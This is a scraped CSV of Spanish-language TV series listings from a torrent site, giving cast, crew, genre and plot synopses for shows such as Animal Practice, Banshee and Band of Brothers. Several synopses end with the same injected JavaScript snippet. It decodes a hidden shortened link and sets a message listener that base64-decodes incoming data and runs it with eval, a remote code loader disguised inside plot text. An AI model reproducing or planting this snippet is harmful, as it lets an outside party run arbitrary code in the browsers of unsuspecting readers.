Series main_page_url,Series name,Ficha tecnica,Resumen
https://www.subtorrents1.com/series/animal-practice/,Animal Practice,"
                       Título Original: Animal Practice
Creador: Alessandro Tanaka y Brian Gatewood
Producción Ejecutiva: Scot Armstrong, Brian Gatewood, Ravi Nandan, Anthony Russo, Joe Russo y Alessandro Tanaka
Estudio: Universal Television
Género: Comedia
Temporada: 1ª  
Episodios: 13
Fecha de estreno: 26 de septiembre de 2012
Distribución: Universal
Horario de emisión: Miércoles 8.30 p.m.

Reparto:
Justin Kirk ... George Coleman
JoAnna Garcia ... Dorothy Crane
Bobby Lee ... Kim Yamamoto
Tyler Labine ... Doug Jackson
Kym Whitley ... Juanita
Betsy Sodaro ... Angela						","
Descripcion
Animal Practice es una comedia centrada en el doctor George Coleman, un conocido veterinario con una impresionante lista de animales famosos como pacientes. Trabaja en el Crane Animal Hospital, una animada clínica veterinaria de la ciudad de Nueva York en la que, habitualmente, parece que son los pacientes los que dirigen el centro. Pero para su desgracia, George descubre que su ex-novia, Dorothy Crane, acaba de heredar el negocio familiar y ahora es su nueva jefa. Inteligente y ambiciosa, Dorothy pondrá la clínica patas arriba para poner orden y chocará con la forma de trabajar de George, más orientada al bienestar animal.
Conoce al doctor George Coleman (Justin Kirk, Weeds), es uno de los veterinarios más prestigiosos de Nueva York. A pesar de sus métodos poco ortodoxos, el éxito de George llega del hecho de que tiene un don innegable con los animales de todo tipo… excepto, claro, los de raza humana. Su filosofía de trabajo es estar rodeado de un ""orden desordenado"". O por decirlo de otra manera, si la sala de espera está llena mientras le grita al dueño de uno de sus pacientes, que así sea.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/bad-teacher/,Bad Teacher,"
                       Título Original: Bad Teacher
Creador: Hilary Winston
Producción Ejecutiva: Gene Stupnitsky, Hilary Winston y Lee Eisenberg 
Estudio: Sony Pictures Television
Género: Comedia
Fecha de estreno: 24 de abril de 2014
Distribución: Sony
Horario de emisión: Jueves 9.30 p.m.
Temporada: 1ª
Episodios: 13

Reparto:
Ari Graynor ... Meredith Davis
Sarah Rodier ... Lily
David Alan Grier ... Carl Graines
Ryan Hansen ... Joel
Sara Gilbert ... Irene
Kristin Davis ... Ginny						","
Descripcion
Bad Teacher es una comedia que adapta a televisión la popular película del mismo nombre protagonizada por Cameron Diaz. En ella, una atractiva, valiente y desvergonzada ex esposa trofeo urde un plan para hacerse pasar por profesora. Su objetivo es poder encontrar un nuevo marido, después de que su millonario esposo se haya marchado con una mujer más joven y la haya dejado sin un centavo, por culpa de un mal acuerdo prematrimonial que firmó sin darse cuenta.
Abandonada, divorciada y arruinada, Meredith Davis (Ari Graynor, Fringe) se inspira en un consejo que le da la extravagante hijastra de una de sus mejores amigas, Lily (Sarah Rodier, El futuro), para desarrollar un plan perfecto en tres fases con el que poder recuperar su vida anterior lo antes posible: 1) hacerse pasar por profesora en el instituto de Lily, 2) conocer y casarse con un padre soltero y millonario, 3) retomar su vida acomodada y despreocupada. Y es que hay un montón de padres solteros ricos, por lo que Meredith comienza a pensar que la carrera docente es un buen lugar para comenzar de nuevo.
(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/ambassadors/,Ambassadors,"
                       Título original
    Ambassadors
Año
    2013
Duración
    60 min.
País
    Reino Unido
Dirección
    Jeremy Webb
Guion
    Rupert Walters, James Wood
Reparto
    David Mitchell, Robert Webb, Susan Lynch, Amara Karan, Shivani Ghai, Keeley Hawes, Andy Lucas, Oliver Dimsdale, Natalia Tena, Debbie Chazen, George Lasha, Sevan Stephan, Velibor Topic, Yigal Naor, Matthew Macfadyen, Lachele Carl, James Doherty, Jenny Galloway
Productora
    BBC Comedy / Big Talk Productions
Género
    Comedia | Miniserie de TV						","
Descripcion
Miniserie de TV. 3 episodios. La serie está ambientada en la ficticia República de Asia Central de Tazbekistán, donde el recién llegado embajador británico Keith Davies se fija la tarea de tratar de asegurar un contrato de compra de helicópteros por 2 mil millones de libras para el Reino Unido.
"
https://www.subtorrents1.com/series/amber/,Amber,"
                       Título original: Amber
Año: 2014
Duración: 60 min.
País: Irlanda
Director: Rob Cawley (Creator),  Paul Duane (Creator),  Thaddeus O'Sullivan
Guión: Rob Cawley, Paul Duane, Gary Duggan
Fotografía: Peter Robertson
Productora: Emitida por la cadena RTÉ; Screenworks
Género: Drama | Secuestros / Desapariciones 
Temporada: 1
Capítulos: 4

Reparto:
Eva Birthistle,  
David Murray,  
Lauryn Canny,  
Levi O'Sullivan,  
Justine Mitchell,  
David Herlihy,  
Declan Conlon,  
Emily Nagle,  
Stella McCusker,  
Shauna Griffith,  
Aoife Maloney,  
Gary Whelan,  
Janice Byrne,  
Laura Jane Laughlin,  
Eleanor Methven,  
Eric Lalor,  
Con Murphy,  
Ned Dennehy,  
Dan Li,  
Stephen Jones,  
Vinny Murphy,  
Aenne Barr

","
Descripcion
Los padres de Amber, Ben y Sarah, se han divorciado hace poco y rehacen de nuevo sus vidas. Pero todo cambia bruscamente cuando Amber no regresa a casa tras pasar la tarde en casa de una amiga.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/a-kid-called-mayonnaise/,A Kid Called Mayonnaise,"
                       Título original
A Kid Called Mayonnaise
Fecha de lanzamiento
Sep. 01, 2017
Última transmisión
Sep. 01, 2017
Temporadas
1
Estado
Pilot 						","
Descripcion
Cuando un niño de un pueblo pequeño, Mayo Davis, se trasladó a Los Ángeles, él sabía que ayudaba a su madre ejecutar un motel sería emocionante. Lo que no sabía era lo solo que sería. Por eso, cuando una misteriosa chica impulsa mediante un flotador en el desfile y las olas en la Clínica Mayo, se embarca en una épica búsqueda y surrealista para encontrarla, sólo para descubrir que él tiene que hacer una elección entre hacer un amigo y hacer un soporte.
"
https://www.subtorrents1.com/series/back-in-the-game/,Back in the Game,"
                       Título original: Back in the Game
Año: 2013
Duración: 22 min.
País: Estados Unidos
Director: Mark Cullen (Creator),  Robb Cullen (Creator),  Glenn Ficarra,  John Requa
Guión: Mark Cullen, Robb Cullen
Música: Michelle Kuznetsky
Productora: 20th Century Fox Television / Kapital Entertainment Género: Comedia | Sitcom. Deporte. Béisbol
Temporada: 1
Capítulos: 13

Reparto:
Maggie Lawson,  
James Caan,  
Lenora Crichlow,  
David Stanford,  
Benjamin Koldyke,  
Griffin Gluck,  
J.J. Totah,  
Shaun Rylee,  
Michelle Betts,  
Kennedy Waite,  
Cooper Roth,  
James Blakely,  
Brandon Salgado,  
Alvin Cowan 

","
Descripcion
Se centra en Terry Gannon, una madre soltera recientemente divorciada que se traslada temporalmente a vivir con su padre separado, un ex jugador de béisbol, bebedor de cerveza. A regañadientes empieza como entrenadora del desamparado equipo de su hijo y vuelve a introducirse en el mundo del deporte que había prometido dejar atrás.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/alpha-house/,Alpha House,"
                       Título original: Alpha House
Año: 2013
País: Estados Unidos
Director: Adam Bernstein 
Guión: Garry Trudeau 
Música: Anton Sanko
Fotografía: Matthew J. Lloyd
Productora: Amazon Studios
Género: Comedia. Drama | Política 


Reparto:

John Goodman,  
Clark Johnson,  
Matt Malloy,  
Mark Consuelos,  
Yara Martinez,  
Alicia Sable,  
Brooke Bloom,  
Kobi Libii,  
Julie White,  
Chance Kelly,  
Ben Rameaka,  
Haley Joel Osment,  
Bjorn Dupaty,  
Matty Blake,  
Tracy Howe 

","
Descripcion
Cuatro senadores republicanos comparten la misma casa de alquiler en DC, y se enfrentan a batallas de reelección, acusaciones y fiestas – todo con sentido del humor. (function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/b-the-beginning/,B The Beginning,"
                       Título original
    B: The Beginning (TV Series) 
Año
    2018
Duración
    22 min.
País
    Japón Japón
Dirección
    Kazuto Nakazawa, Yoshiki Yamakawa 
Guion
    Katsuya Ishida (Creador: Kazuto Nakazawa)
Música
    Yoshihiro Ike
Fotografía
    Animation, Eiji Arai
Reparto
    Animation 
Productora
    Production I.G. Distribuida por Netflix
Género
    Serie de TV. Animación. Ciencia ficción. Intriga 
Web oficial
    https://www.netflix.com/title/80097594						","
Descripcion
Unos científicos crean unos ""nuevos humanos"" para que traigan la paz al mundo, pero son secuestrados por unos malvados con planes muy distintos.
"
https://www.subtorrents1.com/series/apparitions/,Apparitions,"
                       Drama - Fantasía 						","
Descripcion
El padre Jacob, un sacerdote católico que trabaja para promover candidatos a la santidad, cuenta con una talento especial para exorcizar. El sabe que tiene un don, pero está más interesado en su tarea de sumar santos a la iglesia católica. Sin embargo, cuando comienza a desarrollarse una oscura batalla entre el bien y el mal que amenaza el futuro de la humanidad, no le quedará otra que obedecer al llamado del deber.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/angel-from-hell/,Angel from Hell,"
                       Título original: Angel from Hell
Año: 2015
País: Estados Unidos
Director: Tad Quill (Creator)
Guión: Tad Quill
Fotografía: Clark Mathis
Productora: CBS Television Studios
Género: Comedia. Fantástico

Capítulos: 13


Reparto:

Jane Lynch ... Amy
Maggie Lawson ... Allison
Kyle Bornheimer ... Brad
Kevin Pollak ... Marv						","
Descripcion
Allison, una dermatóloga tremendamente perfeccionista, se topa con Amy, una mujer de aspecto extravagante y comportamiento inapropiado que dice ser su ángel guardián. Amy lo sabe todo de ella, incluso sus secretos más íntimos, lo que la lleva a pensar que, a pesar de lo que parece, puede que esa mujer loca que la acompaña a todas partes esté diciendo la verdad.
"
https://www.subtorrents1.com/series/american-vandal/,American Vandal,"
                       Título original
    American Vandal (TV Series)aka 
Año
    2017
Duración
    30 min.
País
    Estados Unidos Estados Unidos
Director
    Tony Yacenda 
Guion
    Seth Cohen, Amy Pocha
Música
    Darien Shulman
Fotografía
    Adam Bricker
Reparto
    Tyler Alvarez, Eduardo Franco, Gabriela Fresquez, Camille Hyde, Carla Jeffery, Jessica Juarez, Carlos Luna, Camille Ramsey, Lou Wilson, Lukas Gage, G. Hannelius, Karly Rothenberg, Saxon Sharbino, Calum Worthy, Aylin Bayramoglu, Myles Brewer, Dendrie Taylor, Liam C. Johnson, Matt Miller, Tucker Albrizzi 
Productora
    3 Arts Entertainment / CBS. Distribuida por Netflix
Género
    Serie de TV. Comedia | Sátira. Crimen. Falso documental 						","
Descripcion
Serie de TV (2017). 8 episodios. Cuando el sospechoso de una gamberrada épica en un instituto afirma ser inocente, un cineasta se pone de su parte en esta sátira sobre los programas de crímenes reales.
"
https://www.subtorrents1.com/series/american-dad/,American Dad,"
                       Título Original: American Dad
Creador: Seth MacFarlane, Mike Barker y Matt Weitzman
Producción Ejecutiva: Seth MacFarlane, Mike Barker y Matt 
Estudio: FOX
Género: Animación
temporada: 7ª
Horario de emisión: Viernes 21.30

Reparto
Seth MacFarlane ... Stan, Roger
Wendy Schaal ... Francine
Scott Grimes ... Steve
Rachel MacFarlane ... Hayley
Dee Bradley Baker ... Klaus						","
Descripcion
Padre Made in USA es una visión irónica de la familia americana que encarna, llevando al extremo las obsesiones y los sin sentidos de una sociedad moderna, en especial la americana.
Stan Smith es el padre Made in USA: trabaja como agente de la CIA y vive en constante alerta por la amenaza de ataques terroristas a su país. A la cabeza de una familia disfuncional intenta trasladar la disciplina castrense a su casa, sin demasiado éxito. Eso sí, más de una vez ha agujereado con su revolver el tostador cuando éste escupía las tostadas calientes…
"
https://www.subtorrents1.com/series/bag-of-bones/,Bag of Bones,"
                       Titulo: Bag of Bones

Director: Mick Garris

Guion: Matt Venne (Novela: Stephen King)

Productora: Emitida por A&E Television; Sennet Entertainment

Año: 2011

País: Estados Unidos

Capitulos: 2

Género: Drama, Terror, Misterio

Duracion: 1 Hora

Reparto :

Pierce Brosnan
Annabeth Gish
Melissa George
Anika Noni Rose
William Schallert						","
Descripcion
Basada en la novela homónima de Stephen King 'Bag of Bones' gira en torno a Mike Noonan (Pierce Brosnan), un escritor de renombre que, tras perder a su mujer Jo y al hijo que crecía en su interior, no consigue hacer que su vida continúe hacia delante.
Cuatro años después decide cambiar de aires y se traslada a una pequeña casa de veraneo que compró junto a su mujer y que hacía tiempo que no visitaba.
Desde el primer momento que Mike se instala en la casa, comenzarán a ocurrir extraños sucesos. Voces sin dueño y presencias invisibles comienzan a ser percibidas atrapandolo en el misterio de la casa, ahora escenario de visitas fantasmales y obsesiones cada vez más abominables…
"
https://www.subtorrents1.com/series/banshee/,Banshee,"
                       Título Original: Bashee
Creador: Alan Ball, Greg Yaitanes, Jonathan Tropper, David Schickler y Peter Macdissi
Producción: Ejecutiva Frank Spotnitz, Jane Featherstone, Stephen Garrett, Alison Jackson y Christopher Aird
Estudio: Your Face Goes Here Entertainment
Género: Drama
Temporada: 1ª
Episodios: 10
Fecha de estreno: 11 de enero de 2013
Lugar de rodaje ----------
Distribución: HBO
Horario de emisión: Viernes 10.00 p.m.

Reparto:

Antony Starr ... Lucas Hood
Ben Cross ... Rabbit
Ivana Milicevic ... Carrie Hopewell
Frankie Faison ... Sugar Bates
Rus Blackwell ... Gordon Hopewell
Ryann Shane ... Deva Hopewell
Daniel Ross Owens ... Dan Kendall
Lili Simmons ... Rebecca Bowman
Ulrich Tomsen ... Kai Proctor
Demetrius Grosse ... Emmett Yawners
Trieste Kelly Dunn ... Siobahn Kelly
Matt Servitto ... Brock Lotus						","
Descripcion
Banshee, ambientada en un pequeño pueblo situado en la zona amish de Pennsylvania, es una serie creada por Jonathan Tropper y David Schickler, que sirven como productores ejecutivos junto con Alan Ball (True Blood), Greg Yaitanes y Peter Macdissi. Narra la historia de un enigmático ex convicto y experto en artes marciales que desempeñará el papel de sheriff con el objetivo de impartir su propio estilo de justicia, mientras ultima un plan que satisfaga sus propios intereses. No será fácil hacerlo. Asumirá la identidad del comisario de Banshee, en donde continuará con sus actividades criminales al tiempo que se esconde los mafiosos a los que traicionó años atrás.
En un extraño giro del destino, un maestro del robo que recientemente ha salido de la cárcel en libertad condicional, asume la identidad de Lucas Hood (Anthony Starr, Rush), el nuevo sheriff del pueblo de Banshee, Pennsylvania, la misma localidad en la que su ex-compañera y amante, que ha cambiado su nombre por el de Carrie Hopewell (Ivana Milicevic, Los ángeles de Charlie), se ha establecido y casado hace varios años. Allí tratará de mantener su verdadera historia en secreto mientras espera por los papeles que se está preparando Job (Hoon Lee, Premium Rush), un inusual aliado que vive en la ciudad de Nueva York, todo un genio de la informática que ha sido pieza clave en sus actividades delictivas anteriores.
"
https://www.subtorrents1.com/series/ballers/,Ballers,"
                       Título original: Ballers
Año: 2015
Duración: 30 min
País: Estados Unidos
Director: Peter Berg
Guión: Steve Sharlet, Stephen Levinson
Fotografía: Jaime Reynoso
Productora: HBO
Género: Comedia, Drama, Deporte

Capítulos: 10


Reparto:

Dwayne Johnson ... Spencer Strasmore
Anabelle Acosta ... Annabella
Christine Quinn ... Molly (as Christine Bently)
Jazmyn Simon ... Julie Green
John David Washington ... Ricky
Omar Benson Miller ... Charles
Rob Corddry ... Joe
Tara Holt ... Kimmy
Taylor Cole (2) ... Stephanie Michaels
Troy Garity ... Jason						","
Descripcion
Narrará la vida de un grupo de jugadores de fútbol americano, algunos en activo y otros retirados, con Dwayne Johnson en el papel de Spencer Strasmore, un atleta ya retirado. El grupo se compone de Charles (Omar Benson Miller), un jugador retirado que está buscando cual es el siguiente paso en su carrera; Ricky (John David Washington), un atleta muy competitivo y espiritual; y Vernon (Donovan Carter), un deportista muy centrado en su familia. Además, tendrán que lidiar con Joe (Rob Corddry), un asesor financiero al que le cuesta encajar; Jason (Troy Garity), un agente de primer nivel; Michaels (Taylor Cole) una reportera de ESPN que está enamorada de Spencer; y Tina (LeToya Luckett), la viuda de uno de los mejores amigos de Spencer.
"
https://www.subtorrents1.com/series/barry/,Barry,"
                       Título original
    Barry (TV Series)
Año
    2018
País
    Estados Unidos
Dirección
    Alec Berg, Bill Hader
Guion
    Alec Berg, Duffy Boudreau, Bill Hader, Elizabeth Sarnoff
Música
    David Wingo
Fotografía
    Paula Huidobro, Brandon Trost
Reparto
    Bill Hader, Henry Winkler, Stephen Root, Sarah Goldberg, Glenn Fleshler, Anthony Carrigan, Marcus Brown, Alejandro Furth, Paula Newsome, John Pirruccello, Mark Ivanir, Dale Pavinski, Karen David, Robert Curtis Brown, Avi Bernard, Paul Black, Walter Fauntleroy, Lou George, Michael Irby, Jason Konopisos, Gary Kraus, Aris Mendoza, Dominic Pace, Irina Voronina
Productora
    HBO
Género
    Serie de TV. Comedia						","
Descripcion
Un asesino a sueldo y aspirante a actor se muda del medio oeste a Los Ángeles y queda maravillado con las clases de teatro a las que acude durante una misión. Estreno USA: 25 marzo 2018 Estreno HBO España: 26 marzo 2018.
"
https://www.subtorrents1.com/series/band-of-brothers-miniserie/,Band Of Brothers (Miniserie),"
                       TÍTULO ORIGINAL: Band of Brothers
AÑO: 2001 	
PAÍS: Estados Unidos
DIRECTOR: Stephen Ambrose (Creator), David Frankel, Tom Hanks, David Leland, Richard Loncraine, David Nutter, Phil Alden Robinson, Mikael Salomon, Tony To
GUIÓN 	Erik Jendresen, Tom Hanks, John Orloff, E. Max Frye, Graham Yost, Bruce C. McKenna, Erik Bork (Libro: Stephen Ambrose)
MÚSICA: Michael Kamen
FOTOGRAFÍA: Remi Adefarasin, Joel Ransom
REPARTO: Damian Lewis, Ron Livingston, Eion Bailey, David Schwimmer, Dale Dye, Scott Grimes, Frank John Hughes, Matthew Settle, Donnie Wahlberg, Rick Warden, Scott Grimes, Neal McDonough, Rick Gómez, James Madio, Kirk Acevedo, Michael Cudlitz, Richard Speight Jr., Dexter Fletcher
PRODUCTORA: Emitida por la cadena HBO; Dreamworks / Playtone
PREMIOS
2001: Globo de Oro: miniserie o película para TV
2001: 6 Premios Emmy: incluyendo mejor miniserie. 19 nominaciones
GÉNERO: Bélico | II Guerra Mundial. Miniserie de TV. Ejército
","
Descripcion
SINOPSIS:
Miniserie de TV. 10 episodios. Basada en el bestseller de Stephen E. Ambrose, ""Band Of Brothers"" narra la historia de la Easy Company, un batallón americano del regimiento 506 de paracaidistas que luchó en Europa durante la II Guerra Mundial. Basada en las entrevistas realizadas a los supervivientes así como en los recuerdos de los periodistas y las cartas de los soldados, ""Hermanos de sangre"" cuenta la experiencia de esos hombres de valor increíble (pero también gran miedo). Ellos eran la élite y sus vidas llegarían a ser una leyenda. Una aclamada serie con la factura de ""Saving Private Ryan"" (Salvar al soldado Ryan), no en vano sus creadores son Steven Spielberg y Tom Hanks -además del propio Stephen Ambrose-. Las escenas de las batallas impresionan por su realismo.
EPISODIOS:
1 ""Currahee"" (Director: Phil Alden Robinson). La compañía Easy se entrena y es presentada al capitán Sobel. Posteriormente es enviada a Inglaterra, y se prepara para el día-D, el desembarco de Normandía.
2 ""Day of Days"" (Director: Richard Loncraine). La compañía desembarca en Normandía y el teniente Winters completa su misión asumiendo el mando.
3 ""Carentan"" (Director: Mikael Salomon). La compañía lucha en Carentan. El soldado Albert Blithe se enfrenta a sus miedos.
4 ""Replacements"" (Director: David Nutter). La compañía Easy, junto con refuerzos y paracaidistas, lucha en Holanda como parte de la operación Market Garden.
5 ""Crossroads"" (Director: Tom Hanks). Winters escribe un informe sobre el reto de una inesperada resistencia al ataque alemán, y tiene cargo de conciencia tras disparar a un soldado adolescente alemán.
6 ""Bastogne"" (Director: David Leland). La compañía Easy lucha en la batalla de Bulge y se asienta cerca de Bastogne.
7 ""The Breaking Point"" (Director: David Frankel). La compañía lucha cerca de Foy, en Bélgica, y las acciones del teniente Norman Dike son vigiladas y cuestionadas.
8 ""The Last Patrol"" (Director: Tony To). La compañía Easy lleva a cabo una peligrosa misión en Haguenau, el capitán Winters es ascendido y David Webster regresa del hospital.
9 ""Why We Fight"" (Director: David Frankel). La compañía descubre asombrada un campo de concentración, lleno de famélicos judíos, del que han huido sus guardianes nazis.
10 ""Points"" (Director: Mikael Salomon). Julio 1945. Hitler ya ha muerto. La compañía se hace con un simbólico bastión nazi, el nido del águila, en Berchtesgaden, y se anuncia el final de la guerra.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/bancroft/,Bancroft,"
                       Bancroft Series de Drama Y Crimen, La serie se sumerge en una fría matanza y los fantasmas de la investigación que la detective Bancroft preferiría mantener enterrados en el pasado. En el drama hay un elenco talentoso y personajes fuertes. Sarah Parish de Broadchurch encabeza el elenco de la serie Bancroft dando vida a la protagonista y junto a ella veremos a Faye Marsay, Amara Karan, Steve Evets, Adam Long y un largo etcétera. Bancroft es una investigadora despiadada y talentosa que provoca respeto y adoración entre sus colegas. Debería ser la elegida para ascender cuando su jefe Alan Taheeri (Art Malik) se jubile, gracias en gran parte a su trabajo en tratar de derrocar a la banda de los Kamara y su cabecilla Athif, aunque ella emplee algunos métodos dudosos. Ha criado a su hijo de 27 años Joe (Adam Long) por su cuenta, alguien para la que ella se muestra muy cercana y extremadamente protectora.						","
Descripcion
"
https://www.subtorrents1.com/series/beautiful-mind/,Beautiful Mind,"

Título original
    Byutipul Maindeu (TV Series) 
Año
    2016
País
    Corea del Sur Corea del Sur
Director
    Mo Wan Il 
Guion
    Tae Hee Kim
Reparto
    Hyuk Jang, So-dam Park, Jun-ho Heo, Hyun-min Yoon, Jae-suk Ha, Moon-Sung Jung, Hyung-kyu Kim, Jae-ryong Lee, Sung-Wook Min, Jeong-se Oh, Se-young Park, Si-won Lee, Jae-Myeong Yoo, Seung-hwan Baek, Jung-kook Woo, Hee-tae Jeong, Seung-su Ryu 
Productora
    KBS2
Género
    Serie de TV. Drama. Thriller 						","
Descripcion
Lee Young Oh es un excelente neurocirujano con cero simpatía por las demás personas. Un día él se ve involucrado con pacientes con muertes bizarras,. Después de conocer a una mujer se enamora, pues ella hace que su sangre vaya de fría a caliente, además empieza a recobrar su humanidad.
"
https://www.subtorrents1.com/series/battlestar-galactica-blood-and-chrome/,Battlestar Galactica: Blood and Chrome,"
                       TÍTULO ORIGINAL: Battlestar Galactica: Blood and Chrome 
AÑO: 2013
PAÍS: Estados Unidos
DIRECTOR: David Eick (Creator), Michael Taylor (Creator), Jonas Pate
GUIÓN: David Eick, Michael Taylor
FOTOGRAFÍA: Lukas Ettlin
PRODUCTORA: David Eick Productions
GÉNERO: Acción. Ciencia ficción | Precuela. Robots. Aventura espacial

REPARTO:
Luke Pasqualino, Ben Cotton, Lili Bordán, Leo Li Chiang, Mike Dopud, Brian Markinson, John Pyper-Ferguson, Adrian Holmes, Karen LeBlanc, Carmen Moore, Zak Santiago

","
Descripcion
Battlestar Galáctica: Blood and Chrome está ambientada en el décimo año de la Guerra Cylon. Mientras la batalla entre los humanos y su creación, una raza robótica despiadada y casi perfecta, se desenvuelve a través de los doce mundos coloniales, un valiente piloto novato entra en escena. Se trata de William Adama (Luke Pasqualino, Skins), que recién cumplidos los 20 años y tras graduarse en la academia militar, se verá asignado a la nueva nave estelar de la flota colonial… la Galáctica. El talentoso, aunque adicto al riesgo, piloto se encontrará muy pronto liderando una peligrosa misión secreta que, si tiene éxito, permitirá cambiar las tornas de la larga década de guerra en favor de los desesperados humanos.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/bates-motel/,Bates Motel,"
                       TÍTULO ORIGINAL: Bates Motel 
AÑO: 2013  
DURACIÓN: 60 min.  
PAÍS: EEUU
DIRECTOR: Anthony Cipriano (Creator) 
GUIÓN: Anthony Cipriano, Kerry Ehrin (Personajes: Robert Bloch) 
MÚSICA: Chris Bacon 
FOTOGRAFÍA: John S. Bartley, Tom Yatsko 
PRODUCTORA: Universal Television / The Wolper Organization 
GÉNERO: Intriga | Precuela 
Temporada: 1
Capítulos: 10

REPARTO:
Freddie Highmore,  Vera Farmiga,  Max Thieriot,  Nicola Peltz,  Richard Harmon,  W. Earl Brown,  Brittney Wilson,  Olivia Cooke						","
Descripcion
Precuela contemporánea de la película Psicosis, que nos hace un retrato íntimo de cómo se desarrolla la psique de Norman Bates durante sus años de adolescencia. Los fans descubrirán su historia de trasfondo oscuro y retorcido y conocerán de primera mano cuán profundamente intrincada es la relación con su madre, Norma, y cómo ello ayudó a forjar a uno de los asesinos en serie más famoso de todos los tiempos.
 
"
https://www.subtorrents1.com/series/battlestar-galactica/,Battlestar Galactica,"
","
Descripcion
"
https://www.subtorrents1.com/series/battle-creek/,Battle Creek,"
                       Título original: Battle Creek
Año: 2015
País: Estados Unidos
Director: Vince Gilligan (Creator), David Shore (Creator), Bryan Singer
Guión: Vince Gilligan, David Shore
Música: Jeff Russo, John McCarthy, John Ottman
Fotografía: Luc Montpellier, Newton Thomas Sigel
Productora: CBS
Género: Drama, Policíaco

Capítulos: 13


Reparto:

Josh Duhamel ... Detective Milton Chamberlain
Dean Winters ... Detective Russ Agnew
Janet McTeer ... Commander Guziewicz
Kal Penn ... Detective Fontanelle White
Aubrey Dollar ... Holly Dale
Edward ""Grapevine"" Fordham, Jr. ... Detective Aaron Funkhauser						","
Descripcion
Russ es un detective local que se caracteriza por ser inteligente, duro, impaciente y pragmático; consigue resultados, pero nadie quiere trabajar con él debido a su carácter. Su método de limpiar las calles es el cinismo, el engaño y los pocos recursos de los que dispone. Por eso rivalizará con Milton, que apuesta más por el diálogo, la confianza y la infinidad de recursos.
"
